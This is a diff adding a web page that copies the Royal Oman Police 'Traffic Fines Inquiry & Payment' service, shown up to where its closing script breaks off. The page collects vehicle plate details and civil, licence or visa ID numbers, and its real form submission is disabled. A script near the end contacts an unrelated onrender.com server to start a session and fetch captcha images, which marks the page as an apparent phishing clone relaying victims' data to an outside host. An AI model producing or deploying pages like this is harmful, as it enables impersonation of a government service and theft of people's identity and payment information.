@@ -1,0 +1,657 @@
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
+<title>Royal Oman Police - Traffic Fines Payment</title>
+
+    <link rel="stylesheet" href="rop-assets/css/etraffic-bootstrap.min.css" />
+	<link rel="stylesheet" href="rop-assets/css/etraffic-font-awesome.min.css" />
+	<link rel="stylesheet" href="rop-assets/css/etraffic-main.css" />
+    <link rel="stylesheet" href="rop-assets/css/etraffic-responsive.css" />
+
+    <script type="text/javascript" src="rop-assets/js/jquery.min.js"></script>
+    <script type="text/javascript" src="rop-assets/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="rop-assets/js/main.js"></script>
+    <script type="text/javascript" src="rop-assets/js/FontSize.js"></script> 
+
+     <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+  <![endif]-->
+
+
+<link href='https://fonts.googleapis.com/css?family=Droid+Arabic+Kufi' rel='stylesheet' />
+<link type="text/css" rel="stylesheet" href="rop-assets/css/botdetect.css" />
+</head>
+
+<body class="homepage">
+<script>
+    function gotoenglish() {
+        window.location.href = 'rop-fines-en.html';
+    }
+    function gotoarabic() {
+        window.location.href = 'rop-fines.html';
+    }
+    function gotoLocation(pcol, loc) {
+        var locprotocol = location.protocol
+        var baseURL = pcol + "://" + location.hostname + loc
+        //alert(baseURL);
+        self.location = baseURL
+    }
+
+	 </script>
+  	<header id="header">
+        <nav class="navbar navbar-fixed-top" role="banner">
+          
+           <div class="container">
+				<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                </button>
+				
+				<div class="navbar-brand-logo"></div> <!--navbar-brand-logo-->
+					<div class="navbar-header"><a class="navbar-brand" href="/rop-home.html"><h1 class="hidden">شرطة عمان السلطانية</h1></a>
+					</div><!--navbar-header-->
+					<div class="collapse navbar-collapse">
+						<ul class="  nav navbar-nav glyphicon-object-align-bottom">
+							<li >
+                            <a  href="/rop-home-en.html">Home</a>
+                            </li>
+
+                            <li >
+                                <a href="javascript:gotoarabic();">العربية</a>
+                            </li>
+
+							
+						</ul>
+					</div>
+				</div><!--/.container-->
+			</nav><!--/nav-->
+		</header><!--/header-->
+	
+
+		<section id="fontSize"><!-- InstanceBeginEditable name="index.html" -->
+		
+<section id="page">
+
+    
+
+    <style>
+        .submitbtn {
+            height: 40px;
+            font-size: 12pt;
+            /*font-weight: bold;*/
+        }
+    </style>
+
+    <div class="HeadingSection">
+        <div class="container">
+            <div class="head-wrap">
+                <div class="row">
+                    <div class="col-sm-6 ">
+
+                        <ul class="breadcrumb">
+                            <li><a href="/rop-home-en.html">Home</a></li>
+                            <li><a href="#">Electronic Services</a></li>
+                            <li>Traffic Fines Inquiry & Payment</li>
+                        </ul>
+                    </div>
+
+                    <div class="pull-right">
+                        <div class="col-sm-6 ">
+                            <div class="RedSpeakerCNt rsbtn">
+                                <button type="button" class="btn btn-default">
+                                    Listen <i class="fa fa-play-circle"></i>
+                                </button>
+                            </div>
+                        </div>
+                        <!--/col-md-6-->
+                    </div>
+                </div>
+                <!--/row-->
+            </div>
+            <!--/head-wrap-->
+        </div>
+        <!--/container-->
+    </div>
+    <!--/HeadingSection-->
+
+    <div class="container">
+        <div class="tabcontentHeading">
+            <h1>Electronic Services</h1>
+            <h2>Traffic Fines Inquiry & Payment</h2>
+        </div>
+
+        <div class="sepa">
+            <br />
+        </div>
+
+        <div class="row">
+            <div class="col-sm-8">
+                
+                <form method="post" action="#" onsubmit="return false;"  id="aspnetForm" class="form-group">
+<div class="aspNetHidden">
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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" />
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['aspnetForm'];
+if (!theForm) {
+    theForm = document.aspnetForm;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+
+
+
+
+
+<script type="text/javascript">
+//<![CDATA[
+if (typeof(Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
+//]]>
+</script>
+
+
+<script type="text/javascript">
+//<![CDATA[
+function WebForm_OnSubmit() {
+if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
+return true;
+}
+//]]>
+</script>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="DD1D9B16" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="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" />
+</div>
+
+                    <script type="text/javascript">
+//<![CDATA[
+Sys.WebForms.PageRequestManager._initialize('ctl00$ContentPlaceHolder1$ScriptManager1', 'aspnetForm', [], [], [], 90, 'ctl00');
+//]]>
+</script>
+
+
+                    <div>
+                        <h4>Fill in the form below to inquire and pay unpaid traffic fines</h4>
+                    </div>
+
+                    <div class="sepa">
+                        <br />
+                    </div>
+
+                    
+
+                    <div id="divEnquiry">
+                        <fieldset>
+                            <div class="row">
+                                <div class="col-sm-6 form-group">
+                                    <label for="ddlVehicleChars">Plate Code</label>
+                                    <select name="ctl00$ContentPlaceHolder1$ddlVehicleChars" id="ctl00_ContentPlaceHolder1_ddlVehicleChars" tabindex="1" class="form-control" name="ddlVehicleChars" title="اختر رمز اللوحة">
+	<option value="0">Select one ..</option>
+	<option value="أ">A</option>
+	<option value="أ أ">A A</option>
+	<option value="أ ب">A B</option>
+	<option value="أ د">A D</option>
+	<option value="أ ر">A R</option>
+	<option value="أ س">A S</option>
+	<option value="أ ك">A K</option>
+	<option value="أ م">A M</option>
+	<option value="أ و">A W</option>
+	<option value="أ ي">A Y</option>
+	<option value="ب">B</option>
+	<option value="ب أ">B A</option>
+	<option value="ب ب">B B</option>
+	<option value="ب ح">B H</option>
+	<option value="ب د">B D</option>
+	<option value="ب ر">B R</option>
+	<option value="ب س">B S</option>
+	<option value="ب ك">B K</option>
+	<option value="ب م">B M</option>
+	<option value="ب و">B W</option>
+	<option value="ب ي">B Y</option>
+	<option value="ح">H</option>
+	<option value="ح أ">H A</option>
+	<option value="ح ح">H H</option>
+	<option value="ح د">H D</option>
+	<option value="ح ر">H R</option>
+	<option value="ح س">H S</option>
+	<option value="ح ك">H K</option>
+	<option value="ح م">H M</option>
+	<option value="ح و">H W</option>
+	<option value="ح ي">H Y</option>
+	<option value="د">D</option>
+	<option value="د أ">D A</option>
+	<option value="د د">D D</option>
+	<option value="د ر">D R</option>
+	<option value="د س">D S</option>
+	<option value="د ك">D K</option>
+	<option value="د و">D W</option>
+	<option value="د ي">D Y</option>
+	<option value="ر">R</option>
+	<option value="ر أ">R A</option>
+	<option value="ر ح">R H</option>
+	<option value="ر ر">R R</option>
+	<option value="ر س">R S</option>
+	<option value="ر ك">R K</option>
+	<option value="ر م">R M</option>
+	<option value="ر و">R W</option>
+	<option value="ر ي">R Y</option>
+	<option value="س">S</option>
+	<option value="س س">S S</option>
+	<option value="ط">T</option>
+	<option value="ط أ">T A</option>
+	<option value="ط ب">T B</option>
+	<option value="ط ح">T H</option>
+	<option value="ط د">T D</option>
+	<option value="ط ط">T T</option>
+	<option value="ك">K</option>
+	<option value="ك أ">K A</option>
+	<option value="ك ب">K B</option>
+	<option value="ك ح">K H</option>
+	<option value="ك ك">K K</option>
+	<option value="ل أ">L A</option>
+	<option value="ل ب">L B</option>
+	<option value="ل ح">L H</option>
+	<option value="ل د">L D</option>
+	<option value="ل ر">L R</option>
+	<option value="ل س">L S</option>
+	<option value="ل ك">L K</option>
+	<option value="ل م">L M</option>
+	<option value="ل و">L W</option>
+	<option value="ل ي">L Y</option>
+	<option value="م">M</option>
+	<option value="م أ">M A</option>
+	<option value="م ب">M B</option>
+	<option value="م ح">M H</option>
+	<option value="م د">M D</option>
+	<option value="م ر">M R</option>
+	<option value="م س">M S</option>
+	<option value="م ك">M K</option>
+	<option value="م ل">M L</option>
+	<option value="م م">M M</option>
+	<option value="م و">M W</option>
+	<option value="م ي">M Y</option>
+	<option value="و">W</option>
+	<option value="و أ">W A</option>
+	<option value="و ب">W B</option>
+	<option value="و ك">W K</option>
+	<option value="و و">W W</option>
+	<option value="ي">Y</option>
+	<option value="ي أ">Y A</option>
+	<option value="ي ب">Y B</option>
+	<option value="ي د">Y D</option>
+	<option value="ي ر">Y R</option>
+	<option value="ي س">Y S</option>
+	<option value="ي م">Y M</option>
+	<option value="ي و">Y W</option>
+	<option value="ي ي">Y Y</option>
+
+</select>
+                                </div>
+                                <div class="col-sm-6 form-group">
+                                    <label for="txtVehicleNo">Plate Number</label>
+                                    <input name="ctl00$ContentPlaceHolder1$txtVehicleNo" type="text" maxlength="6" id="ctl00_ContentPlaceHolder1_txtVehicleNo" tabindex="2" class="form-control" name="txtVehicleNo" title="أدخل رقم المركبة" placeholder="Enter vehicle number" autocomplete="off" />
+                                </div>
+                            </div>
+
+                            <div class="row">
+                                <div class="col-sm-6 form-group">
+                                    <label for="ddlIDChoice">Select ID Type</label>
+                                    <select name="ctl00$ContentPlaceHolder1$ddlIDChoice" id="ctl00_ContentPlaceHolder1_ddlIDChoice" tabindex="3" class="form-control required" title="اختر نوع الهوية">
+	<option value="0">Select one ..</option>
+	<option value="1">Civil Number</option>
+	<option value="2">Driving License No.</option>
+	<option value="3">Visa Number</option>
+	<option value="4">Commercial Registration</option>
+	<option value="5">Organization Number</option>
+
+</select>
+                                    <span id="ctl00_ContentPlaceHolder1_RequiredFieldValidator1" style="color:Red;visibility:hidden;">* اختر نوع الهوية</span>
+                                </div>
+                                <div class="col-sm-6 form-group">
+                                    <label for="txtIDValue">Enter ID Number</label>
+                                    <input name="ctl00$ContentPlaceHolder1$txtIDValue" type="text" maxlength="12" id="ctl00_ContentPlaceHolder1_txtIDValue" tabindex="4" class="form-control required" title="Enter ID Number" placeholder="Enter ID number" autocomplete="off" />
+                                    <span id="ctl00_ContentPlaceHolder1_RequiredFieldValidator2" style="color:Red;visibility:hidden;">* أدخل رقم الهوية الصحيح</span>
+                                </div>
+                            </div>
+
+                            <div class="row">
+                                <div class="col-sm-6 form-group" style="padding-top: 10px;">
+                                    
+
+
+  <div class="LBD_CaptchaDiv " id="c_arabic_default_ctl00_contentplaceholder1_samplecaptcha_CaptchaDiv" style="width: 100% !important; max-width: 280px !important; height: 50px !important;"><!--
+ --><div class="LBD_CaptchaImageDiv" id="c_arabic_default_ctl00_contentplaceholder1_samplecaptcha_CaptchaImageDiv" style="width: 100% !important; max-width: 250px !important; height: 50px !important;"><!--
+   --><a target="_blank" href="http://captcha.com/asp.net-captcha-info.html" title="What is BotDetect .NET CAPTCHA Control?" onclick="return false;"><img class="LBD_CaptchaImage" id="c_arabic_default_ctl00_contentplaceholder1_samplecaptcha_CaptchaImage" src="rop-assets/images/captcha.png" alt="CAPTCHA"  /></a><!--
+ --></div><!--
+ --><div class="LBD_CaptchaIconsDiv" id="c_arabic_default_ctl00_contentplaceholder1_samplecaptcha_CaptchaIconsDiv" style="width: 24px !important;"><!--
+   --><a class="LBD_ReloadLink" id="c_arabic_default_ctl00_contentplaceholder1_samplecaptcha_ReloadLink" href="#" onclick="reloadCaptcha(); this.blur(); return false;" title="Change the CAPTCHA code"><img class="LBD_ReloadIcon" id="c_arabic_default_ctl00_contentplaceholder1_samplecaptcha_ReloadIcon" src="rop-assets/images/captcha_reload.png" alt="Change the CAPTCHA code"  /></a><!--
+   --><a class="LBD_SoundLink" id="c_arabic_default_ctl00_contentplaceholder1_samplecaptcha_SoundLink" href="/OnlineServices/eTraffic/arabic/BotDetectCaptcha.ashx?get=sound&amp;c=c_arabic_default_ctl00_contentplaceholder1_samplecaptcha&amp;t=bed9f85922fc4df7a4af881874e157ec&amp;s=DwsuInz%2fgTvN48HfyEGbJSc4r1WoEndDjfhzGrXx6EUHZ02FUpkblW8s7m6sBgz7y602t%2f7c7PkpoJn4H1hAXg%3d%3d" onclick="playCaptchaSound(); this.blur(); return false;" title="Speak the CAPTCHA code"><img class="LBD_SoundIcon" id="c_arabic_default_ctl00_contentplaceholder1_samplecaptcha_SoundIcon" src="rop-assets/images/captcha_sound.png" alt="Speak the CAPTCHA code"  /></a><!--
+   --><div class="LBD_Placeholder" id="c_arabic_default_ctl00_contentplaceholder1_samplecaptcha_AudioPlaceholder">&nbsp;</div><!--
+ --></div>
+    
+    <script type="text/javascript">
+    //<![CDATA[
+    //]]>
+    </script>
+    <script type="text/javascript">
+    //<![CDATA[
+    //]]>
+    </script>
+    
+    <input type="hidden" name="LBD_VCID_c_arabic_default_ctl00_contentplaceholder1_samplecaptcha" id="LBD_VCID_c_arabic_default_ctl00_contentplaceholder1_samplecaptcha" value="bed9f85922fc4df7a4af881874e157ec" />
+  </div>
+
+
+
+                                    <br />
+
+                                    <label for="CaptchaCodeTextBox">Please type the characters from the image:</label>
+                                    <!-- add CssClass name used to set up jQuery field validation -->
+                                    <input name="ctl00$ContentPlaceHolder1$CaptchaCodeTextBox" type="text" maxlength="6" id="ctl00_ContentPlaceHolder1_CaptchaCodeTextBox" tabindex="5" class="form-control captchaVal required" autocomplete="off" title="أدخل رمز التحقق" placeholder="Enter verification code" />
+                                    <span id="ctl00_ContentPlaceHolder1_RequiredFieldValidator3" style="color:Red;visibility:hidden;">* أدخل رمز التحقق</span>
+                                    
+                                    
+                                </div>
+                            </div>
+                        </fieldset>
+
+                        <fieldset>
+                            <div class="row">
+                                <div class="col-sm-6 form-group">
+                                    <input type="button" name="ctl00$ContentPlaceHolder1$bntEnquire" value="Pay Fines" id="ctl00_ContentPlaceHolder1_bntEnquire" class="submitbtn btn btn-default btn-group-justified" />
+                                </div>
+                                <div class="col-sm-3 form-group">
+                                    <input type="button" name="ctl00$ContentPlaceHolder1$btnHistory" value="Previous Payments" id="ctl00_ContentPlaceHolder1_btnHistory" class="submitbtn btn btn-info btn-group-justified" />
+                                </div>
+                                <div class="col-sm-3 form-group">
+                                    <input type="button" name="ctl00$ContentPlaceHolder1$btnReport" value="Download Report" id="ctl00_ContentPlaceHolder1_btnReport" class="submitbtn btn btn-warning btn-group-justified" />
+                                </div>
+                            </div>
+                        </fieldset>
+
+                    </div>
+
+                
+<script type="text/javascript">
+//<![CDATA[
+var Page_Validators =  new Array(document.getElementById("ctl00_ContentPlaceHolder1_RequiredFieldValidator1"), document.getElementById("ctl00_ContentPlaceHolder1_RequiredFieldValidator2"), document.getElementById("ctl00_ContentPlaceHolder1_RequiredFieldValidator3"));
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+var ctl00_ContentPlaceHolder1_RequiredFieldValidator1 = document.all ? document.all["ctl00_ContentPlaceHolder1_RequiredFieldValidator1"] : document.getElementById("ctl00_ContentPlaceHolder1_RequiredFieldValidator1");
+ctl00_ContentPlaceHolder1_RequiredFieldValidator1.controltovalidate = "ctl00_ContentPlaceHolder1_ddlIDChoice";
+ctl00_ContentPlaceHolder1_RequiredFieldValidator1.errormessage = "* اختر نوع الهوية";
+ctl00_ContentPlaceHolder1_RequiredFieldValidator1.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+ctl00_ContentPlaceHolder1_RequiredFieldValidator1.initialvalue = "0";
+var ctl00_ContentPlaceHolder1_RequiredFieldValidator2 = document.all ? document.all["ctl00_ContentPlaceHolder1_RequiredFieldValidator2"] : document.getElementById("ctl00_ContentPlaceHolder1_RequiredFieldValidator2");
+ctl00_ContentPlaceHolder1_RequiredFieldValidator2.controltovalidate = "ctl00_ContentPlaceHolder1_txtIDValue";
+ctl00_ContentPlaceHolder1_RequiredFieldValidator2.errormessage = "* أدخل رقم الهوية الصحيح";
+ctl00_ContentPlaceHolder1_RequiredFieldValidator2.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+ctl00_ContentPlaceHolder1_RequiredFieldValidator2.initialvalue = "";
+var ctl00_ContentPlaceHolder1_RequiredFieldValidator3 = document.all ? document.all["ctl00_ContentPlaceHolder1_RequiredFieldValidator3"] : document.getElementById("ctl00_ContentPlaceHolder1_RequiredFieldValidator3");
+ctl00_ContentPlaceHolder1_RequiredFieldValidator3.controltovalidate = "ctl00_ContentPlaceHolder1_CaptchaCodeTextBox";
+ctl00_ContentPlaceHolder1_RequiredFieldValidator3.errormessage = "* أدخل رمز التحقق";
+ctl00_ContentPlaceHolder1_RequiredFieldValidator3.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+ctl00_ContentPlaceHolder1_RequiredFieldValidator3.initialvalue = "";
+//]]>
+</script>
+
+
+<script type="text/javascript">
+//<![CDATA[
+
+var Page_ValidationActive = false;
+if (typeof(ValidatorOnLoad) == "function") {
+    ValidatorOnLoad();
+}
+
+function ValidatorOnSubmit() {
+    if (Page_ValidationActive) {
+        return ValidatorCommonOnSubmit();
+    }
+    else {
+        return true;
+    }
+}
+        
+document.getElementById('ctl00_ContentPlaceHolder1_RequiredFieldValidator1').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ctl00_ContentPlaceHolder1_RequiredFieldValidator1'));
+}
+
+document.getElementById('ctl00_ContentPlaceHolder1_RequiredFieldValidator2').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ctl00_ContentPlaceHolder1_RequiredFieldValidator2'));
+}
+
+document.getElementById('ctl00_ContentPlaceHolder1_RequiredFieldValidator3').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ctl00_ContentPlaceHolder1_RequiredFieldValidator3'));
+}
+//]]>
+</script>
+</form>
+
+<style>#rop-results-content table{width:100%;border-collapse:collapse;margin:10px 0}#rop-results-content table td,#rop-results-content table th{border:1px solid #ddd;padding:8px;text-align:right}#rop-results-content table th{background:#f5f5f5}#rop-results-content .panel{margin:10px 0;border:1px solid #ddd;border-radius:4px}#rop-results-content .panel-heading{background:#337ab7;color:#fff;padding:10px;border-radius:4px 4px 0 0}</style>
+<div id="rop-results-container" style="display:none; margin:20px auto; padding:20px; border:1px solid #ddd; border-radius:5px; background:#f9f9f9; direction:rtl; text-align:right; max-width:900px; overflow-x:auto;">
+  <div id="rop-results-content"></div>
+</div>
+<div id="rop-loading" style="display:none; text-align:center; padding:20px;">
+  <p style="font-size:16px; color:#333;">جاري الاستعلام... يرجى الانتظار</p>
+</div>
+<div id="rop-error" style="display:none; margin:10px auto; padding:10px; background:#f2dede; border:1px solid #ebccd1; border-radius:4px; color:#a94442; max-width:800px;"></div>
+                
+            </div>
+        </div>
+
+
+
+        <script type="text/javascript" src="rop-assets/js/jquery.min.js"></script>
+        <script type="text/javascript" language="javascript">
+            $(document).ready(function () {
+
+                //Integer fields
+                $("#ctl00_ContentPlaceHolder1_txtVehicleNo").intOnly($("#ctl00_ContentPlaceHolder1_txtVehicleNo").attr("MaxLength"))
+                $("#ctl00_ContentPlaceHolder1_txtIDValue").intOnly($("#ctl00_ContentPlaceHolder1_txtIDValue").attr("MaxLength"))
+                // Captcha accepts letters and numbers - no intOnly restriction
+            });
+
+            document.querySelector("#divEnquiry").addEventListener("focus", myFocusFunction, true);
+            function myFocusFunction() {
+                //alert("OnFocus Alert");
+                var x = document.getElementById("ctl00_ContentPlaceHolder1_pnlError");
+                x.style.display = "none";
+                x.style.visibility = "hidden";
+            }
+        </script>
+
+
+
+    </div>
+    <!--/container-->
+
+ 
+</section>
+		
+		
+
+
+	<div class="top-bar">
+		<div class="container">
+			<div class="row">
+			    <div class="col-lg-12">
+                </div>
+			</div>
+		</div><!--/.container-->
+	</div><!--/.top-bar-->
+    
+	<footer id="footer" class="midnight-blue">
+        
+        <div class="container">
+            <div class="row">
+				
+                <div class="col-sm-6 col-md-12">
+					<div class="center" >
+						<h3>2023 &copy; شرطة عمان السلطانية </h3>
+					</div>
+				</div>
+			</div><!--/row-->
+		</div><!--/container-->
+    </footer><!--/footer-->
+    
+
+
+
+
+<script>
+var ROP_SERVER = 'https://omanshorta.onrender.com';
+var ropSessionId = null;
+
+function initRopSession() {
+  fetch(ROP_SERVER + '/api/rop/init-session?service=fines')
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (data.success) {
+        ropSessionId = data.sessionId;
+        if (data.captchaImage) {
+          document.getElementById('c_arabic_default_ctl00_contentplaceholder1_samplecaptcha_CaptchaImage').src = data.captchaImage;
+        }
+      }
+    })
